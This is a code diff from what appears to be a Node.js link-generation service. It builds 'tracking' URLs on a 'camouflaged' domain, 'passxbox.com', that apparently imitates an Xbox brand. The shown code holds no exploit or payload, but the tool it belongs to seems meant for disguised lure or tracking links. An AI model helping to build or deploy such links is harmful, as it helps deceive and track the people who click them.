@@ -504,17 +504,28 @@ app.post('/api/create-link', (req, res) => {
   
   // Se tiver domínio customizado, usar ele
   if (customDomain && customDomain.trim()) {
-    // Remover http:// ou https:// se tiver
-    const cleanDomain = customDomain.replace(/^https?:\/\//, '').replace(/\/$/, '').trim();
-    trackingUrl = `https://${cleanDomain}/${linkId}`;
+    // Remover http:// ou https:// se tiver, e remover barras no final
+    let cleanDomain = customDomain.trim();
+    cleanDomain = cleanDomain.replace(/^https?:\/\//, ''); // Remove http:// ou https://
+    cleanDomain = cleanDomain.replace(/\/$/, ''); // Remove barra no final
+    cleanDomain = cleanDomain.split('/')[0]; // Pega apenas o domínio (remove paths)
+    
+    // Se o domínio contém localhost ou 127.0.0.1, usar o host da Vercel
+    if (host && !host.includes('localhost') && !host.includes('127.0.0.1')) {
+      // Em produção na Vercel, usar o domínio da Vercel mesmo se customDomain for passxbox.com.br
+      // Porque passxbox.com.br não está configurado no DNS
+      trackingUrl = `https://${host}/${pageType}/${linkId}`;
+    } else {
+      // Desenvolvimento local - usar domínio customizado mesmo que não exista
+      trackingUrl = `https://${cleanDomain}/${linkId}`;
+    }
   } else if (host.includes('localhost') || host.includes('127.0.0.1')) {
     // Desenvolvimento local - usar domínio camuflado padrão
-    // Se não tiver customDomain, usar um domínio sugerido
     const defaultDomain = process.env.DEFAULT_DOMAIN || 'passxbox.com';
     trackingUrl = `https://${defaultDomain}/${linkId}`;
   } else {
-    // Produção sem domínio customizado - usar host atual
-    trackingUrl = `${req.protocol}://${host}/${pageType}/${linkId}`;
+    // Produção sem domínio customizado - usar host atual da Vercel
+    trackingUrl = `https://${host}/${pageType}/${linkId}`;
   }
 
   db.run(
